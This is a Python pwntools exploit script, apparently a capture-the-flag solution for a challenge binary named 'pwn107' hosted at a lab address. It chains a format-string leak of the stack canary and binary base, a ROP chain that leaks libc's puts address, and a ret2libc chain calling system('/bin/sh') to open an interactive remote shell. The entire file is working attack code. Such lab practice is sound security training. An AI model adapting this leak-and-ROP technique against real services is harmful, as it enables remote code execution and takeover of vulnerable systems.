from pwn import *
from pwn import p64

# ====================================================================================

context.log_level = "error"
# pros = process("../Tasks/pwn107.pwn107")
pros = remote("10.10.239.216",9007)
elf = ELF("../Tasks/pwn107.pwn107")
rop = ROP("../Tasks/pwn107.pwn107")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# ====================================================================================

pros.recvuntil(b"streak? ")

# PART 1 ( BINARY BASE ADDRESS LIKAGE )

payload = b"%13$p.%11$p"
pros.sendline(payload)

pros.recvuntil(b"streak: ")
leaks = pros.recvline().strip()
print(leaks)
canary = int(leaks.split(b".")[0],16)
start = int(leaks.split(b".")[1],16)
print(hex(start),hex(canary))

binary_base_address = start - elf.symbols["_start"]
print(binary_base_address)
# ====================================================================================

puts_got = binary_base_address + elf.got["puts"]
puts_plt = binary_base_address + elf.symbols["puts"]
rdi_addr = binary_base_address + rop.find_gadget(["pop rdi","ret"]).address
main_addr = binary_base_address + elf.symbols["main"]

# ====================================================================================

# PART 2 ( LIBC BASE ADDRESS LIKAGE )

payload = b"A" * 24
payload += p64(canary)
payload += b"A" * 8
payload += p64(rdi_addr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

pros.sendline(payload)
pros.recvuntil(b"up]")
pros.recvlines(3)

puts_addr = u64(pros.recvline().strip().ljust(8,b"\x00"))

libc_base_address = puts_addr - libc_elf.symbols["puts"]

# ==============================================================================

pros.sendline(b"AAA")

system_addr = libc_base_address + libc_elf.symbols["system"]
sh_addr = libc_base_address + next(libc_elf.search(b"/bin/sh"))
exit_addr = libc_base_address + libc_elf.symbols["exit"]
ret_addr = binary_base_address + rop.find_gadget(["ret"]).address

# ==============================================================================


# PART 3 ( CALLING LIBRARY FUNCTION (SYSTEM) TO POP-UP SHELL )

payload = b"A" * 24
payload += p64(canary)
payload += b"A" * 8
payload += p64(rdi_addr)
payload += p64(sh_addr)
payload += p64(ret_addr)
payload += p64(system_addr)
payload += p64(exit_addr)

pros.sendline(payload)
pros.interactive()

# ==============================================================================